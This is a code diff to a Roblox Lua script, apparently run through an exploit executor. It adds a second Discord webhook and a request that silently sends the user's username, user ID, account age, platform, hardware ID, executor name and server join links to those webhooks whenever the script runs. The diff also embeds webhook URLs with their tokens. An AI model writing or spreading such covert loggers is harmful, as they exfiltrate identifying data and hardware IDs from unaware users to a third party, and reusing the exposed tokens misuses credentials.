@@ -38,10 +38,60 @@ local jobIdLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?serverJob
 
 HttpService = game:GetService("HttpService")
 WebHook_URL = "https://discord.com/api/webhooks/1306356441304531034/jNRtQ4KTfEOvI4QcvTHBWj3oY9GJ4NryVA1ecKqTzCRXzTLCyqlVLCT-u2_sbsECIC9F"
+WebHook_URL2 = "https://discord.com/api/webhooks/1313233827803566155/LVXsW-PTqyKdH2UWrraZI6phuvSuWZvH5DCkJ2TmOlfoBEGddF3v6G7-5yjqg8pM05Jv"
 
 local http_request = request(
 {
 	Url = WebHook_URL,
+	Method = "POST",
+	Headers = {
+		["Content-Type"] = "application/json"
+	},
+	Body = HttpService:JSONEncode({
+		username = game.Players.LocalPlayer.Name .." Executed The Script",
+		avatar_url = "https://cdn.discordapp.com/icons/1293964144529113138/e592a64d5170f7812bb5fd953323b8c5.webp?size=128",
+		content = "",
+        embeds = {
+            {
+                title = "🎮 Game Information",
+                description = string.format("**[%s](%s)**\n`ID: %d`", GameName, gameLink, game.PlaceId),
+                color = tonumber("0x2ecc71")
+            },
+            {
+                title = "👤 Player Information",
+                description = string.format(
+                    "**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Ping:** %dms",
+                    DisplayName, playerLink, Username, UserId, MembershipType, AccountAge, Platform, Ping
+                ),
+                color = MembershipType == "Premium" and tonumber("0xf1c40f") or tonumber("0x3498db")
+            },
+            {
+                title = "Roblox Hwid",
+                description = string.format(
+                    "**HWID:** `%s`",
+                    Hwid
+                ),
+                color = tonumber("0xe74c3c")
+            },
+            {
+                title = "⚙️ Technical Details",
+                description = string.format(
+                    "**Executor:** `%s`\n**Job ID:** [Click to Join](%s)\n**Mobile Join:** [Click](%s)\n**Version:** `%s`",
+                    executor, jobIdLink, mobileJoinLink, Version
+                ),
+                color = tonumber("0x95a5a6"),
+                footer = { 
+                    text = string.format("📅 Date: %s | ⏰ Time: %s", date, time )
+                }
+            }
+        }
+	}
+)
+})
+
+local http_request = request(
+{
+	Url = WebHook_URL2,
 	Method = "POST",
 	Headers = {
 		["Content-Type"] = "application/json"
